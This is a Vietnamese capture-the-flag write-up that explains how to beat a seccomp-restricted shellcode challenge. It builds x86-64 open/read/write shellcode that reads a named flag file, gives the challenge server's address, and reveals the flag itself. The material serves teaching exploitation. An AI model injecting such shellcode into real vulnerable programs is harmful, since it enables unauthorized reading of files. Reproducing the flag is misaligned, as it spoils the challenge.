# ⛳ Shellcode

- Description: dễ mà tự viết đi trên trên mạng không có đâu
  - Bắt buộc dùng open, read, write để đọc flag
  - Không cần quan tâm đến seccomp
  - Dùng syscall ngoài open, read, write sẽ bị khóa
  - nc 45.122.249.68 10017
- Hint:
  - Bạn Nhật Trường có một bài blog tương tự bài này trên x86, thử chuyển code sang x86-64 bạn sẽ giải được bài này link: https://drx.home.blog/2019/04/03/pwnable-tw-orw/

## Write-up:

Disassemble hàm main, ở đây ta thấy có hàm **setup_seccomp** sau khi chúng ta input bằng hàm **read@plt**.

```
0x000000000000132f <+122>:   call   0x10f0 <read@plt>
0x0000000000001334 <+127>:   mov    eax,0x0
0x0000000000001339 <+132>:   call   0x1209 <setup_seccomp>
```

Vào xem thử hàm **setup_seccomp** làm gì trên IDA.

![image](https://user-images.githubusercontent.com/48288606/147545255-85432ebe-de11-4b03-99ee-5edfab194115.png)

Theo như đoạn mã giả và tìm kiếm về seccomp (secure computing mode) thì **setup_seccomp** chỉ là một hàm định nghĩa các rule để giới hạn lại và quy định các **system call**. Đại khái, chương trình thực hiện khởi tạo seccomp rule bằng **seccomp_init()**, thêm rule bởi hàm **seccomp_rule_add()** và ta thấy có 3 dòng để set rule cho 3 system call là "read/ write/ open" và dùng **seccomp_load()** để apply các rule vào kernel.<br>
=> Vậy cho nên theo như hint thì thật ra chúng ta không cần xem đoạn này, hint đã gợi ý chỉ được dùng **open, read, write** trong shellcode để đọc flag.

Khi chạy chương trình ta biết được flag nằm trong file "PhaPhaKhongCoDon.txt"
```
Use open, read, write to get flag, flag is in PhaPhaKhongCoDon.txt
```
### Viết shellcode:

Với 3 system call trên, ta dự định sẽ thực hiện lần lượt: open(mở stream đọc file) -> read(đọc dữ liệu từ stream cho trước và đưa vào buffer) -> write(ghi dữ liệu từ buffer ra output stream). Bây giờ ta sẽ xác định các parameter đưa đúng theo quy ước gọi syscall [tại đây](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md) (Table x86_64 (64-bit))

Khởi tạo stack, lưu ý trên x86_64 không push trực tiếp một giá trị hằng vào stack được nên phải thông qua thanh ghi

Code:
```
        'mov r8, %s' % hex(u64('.txt\0\0\0\0')),
        'mov r9, %s' % hex(u64('ongCoDon')),
        'mov r10, %s' % hex(u64('PhaPhaKh')),
        'push r8',
        'push r9', 
        'push r10', 
```

Lệnh open() - [Official manual](https://man7.org/linux/man-pages/man2/open.2.html):
- %rax: 0x02
- arg0 (%rdi): const char \*filename .Ở đây mình sẽ đưa chuỗi "PhaPhaKhongCoDon.txt" vào và vì kiến trúc 64bits nên size tối đa là 8 bytes, còn thiếu thì đệm thêm byte NULL vào chuỗi để không ảnh hưởng quá trình gọi syscall
- arg1 (%rsi): int flags. Chế độ cho stream open. Được định nghĩa trong file `/usr/include/asm-generic/fcntl.h` vì hàm **open()** được tạo trong thư viện **fcntl.h**. Mình có thể search để biết các giá trị này nhanh hơn. Do ban đầu đọc manual mình không rõ cách truyền vào mấy flags này nên mới đào sâu vậy 😊. Ở đây mình chỉ đọc (O_RDONLY) nên dùng **0x0**.
```
#define O_ACCMODE       00000003
#define O_RDONLY        00000000
#define O_WRONLY        00000001
#define O_RDWR          00000002
```

Code:
```
        'xor rdx, rdx',
        'xor rsi, rsi',
        'mov rdi, rsp',
        'mov rax, 0x2',
        'syscall',
```

- arg2 (%rdx): umode_t mode. (Định nghĩa permission cho file). Ta dùng **0x0** 
- Return value: trả về file descriptor lưu trong rax.

Lệnh read() - [Official manual](https://man7.org/linux/man-pages/man2/read.2.html). Tương tự:
- %rax: 0x00
- arg0 (%rdi): unsigned int fd. Đưa file descriptor từ stream open ở trên vào. 
- arg1 (%rsi): char \*buf. Nhét chuỗi trên vào
- arg2 (%rdx): size_t count. Size của buffer để đọc, cho tùy ý miễn đủ đọc flag.
- Return value: Số lượng byte được đọc thật sự được trả về

Code:
```
        'mov rsi, rsp',
        'mov rdi, rax',  
        'mov rdx, 0x100',
        'mov rax, 0x0',  
        'syscall',
```
Lệnh write() - [Official manual](https://man7.org/linux/man-pages/man2/write.2.html). Tương tự:
- %rax: 0x01
- arg0 (%rdi): unsigned int fd. File descriptor đưa ra ngoài output nên phải dùng stream của STDOUT là **0x1**
- arg1 (%rsi): const char \*buf. Tham số này không quan trọng vì ta đã xác định đưa chuỗi ký tự cần ghi ra ngoài STDOUT stream rồi
- arg2 (%rdx): size_t count

Code:
```
        'mov rdi, 0x1',
        'mov rdx, rax',
        'mov rax, 0x1',
        'syscall'
```

Tham khảo shellcode hoàn chỉnh [tại đây](Shellcode/shellcode.py)


Flag: **Wanna.One{ve_so_sang_mua_chieu_xo_em_nghi_anh_la_ai_ma_sang_cua_chieu_do}**
